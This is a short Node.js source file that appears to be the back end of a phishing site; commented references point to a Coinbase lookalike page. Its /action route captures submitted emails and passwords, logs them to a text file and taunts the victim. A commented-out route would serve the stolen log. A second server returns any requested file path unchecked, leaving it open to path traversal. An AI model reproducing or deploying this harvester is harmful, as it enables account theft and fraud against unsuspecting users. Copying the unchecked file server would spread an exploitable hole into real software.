var http = require('http');
var express = require('express');
var app = require('express')();
const fs = require('fs');
var url = require('url');
var bodyParser = require('body-parser');

app.use(bodyParser.urlencoded({ extended: true }));


//app.get('/ch3ck4info', function(req, res) {
	//fs.readFile("./log.txt", function(err, data){
		//res.send(data);
	//});
    //res.sendFile(__dirname + '/log.txt');
 //});


app.get('/action', function(req, res){
  res.send("haHA u g0t haCk3d");
  //res.sendFile(__dirname + '/coinbase.html');
  //console.log(req.query);
  console.log(req.query.email);
  console.log(req.query.password);

  fs.appendFile('./log.txt', `${req.query.email} , ${req.query.password}\n`, function (err) {
      if (err) return console.log(err);
	//res.sendFile(__dirname + '/log.txt');
  res.end();
});
});

app.listen(8080, function() {
  //console.log('Server running at port 8080');
});

http.createServer(function (req, res) {
    var q = url.parse(req.url, true);
    var filename = "." + q.pathname;
    if (filename == "./")
    {
    fs.readFile("./index.html", function(err, data) {
      if (err) {
        res.writeHead(404, {'Content-Type': 'text/html'});
        return res.end("404 Not Found");
      }
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.write(data);
      return res.end();
    });
  } else{
    fs.readFile(filename, function(err, data) {
      if (err) {
        res.writeHead(404, {'Content-Type': 'text/html'});
        return res.end("404 Not Found");
      }
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.write(data);
      return res.end();
        });
      }
  }).listen(3000);
